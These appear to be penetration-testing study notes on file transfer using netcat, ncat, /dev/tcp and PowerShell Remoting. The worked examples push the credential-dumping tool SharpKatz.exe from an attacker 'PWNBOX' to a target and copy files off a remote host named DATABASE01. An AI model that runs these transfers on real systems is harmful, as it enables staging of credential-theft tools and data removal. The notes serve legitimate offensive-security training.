-----------
# NETCAT & NCAT
----------
- NCAT: a reimplementation of nc to support SSL, IPv6, SOCKS and HTTP proxies
- TARGET
```bash
# NC
nc -lp 8000 > SharpKatz.exe

# NCAT
ncat -l -p 8000 --recv-only > SharpKatz.exe
	--recv-only: close the connection once the file transfer is finished.
```
- PWNBOX
```bash
# NC
nc -q 0 $TARGET 8000 < SharpKatz.exe
	-q 0 will tell Netcat to close the connection once it finishes.
# NCAT
ncat --send-only $TARGET 8000 < SharpKatz.exe
```

- We can also connect the TARGET to a port on our PWNBOX to perform file transfer.
- PWNBOX
```bash
# NC
sudo nc -lp 443 -q 0 < SharpKatz.exe
#NCAT
sudo ncat -lp 443 --send-only < SharpKatz.exe
```
- TARGET
```bash
# NC
nc $PWNBOX 443 > SharpKatz.exe
# NCAT
cat < /dev/tcp/$PWNBOX/443 > SharpKatz.exe
```

---------------------
# PowerShell Session File Transfer
-----------------
- When SMB, HTTP or HTTPS are not available, we can use `PowerShell Remoting (WinRM)`
- `PowerShell Remoting` allows us to execute scripts/commands on a remote computer using PowerShell sessions.
-  DC01 - Confirm WinRM port TCP 5985 is open on DATABASE01
```PowerShell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```
- Create a PowerShell Remoting Session to DATABASE01
```PowerShell
$Session = New-PSSession -ComputerName DATABASE01
```
- Copy file from LocalHost to the DATABASE01 Session
```PowerShell
Copy-Item -Path $FILE -ToSession $Session -Destination $DIR
```
- Copy $File2 from DATABASE01 Session to LocahHost
```PowerShell
Copy-Item -Path $File2 -Destination $DIR -FromSession $Session
```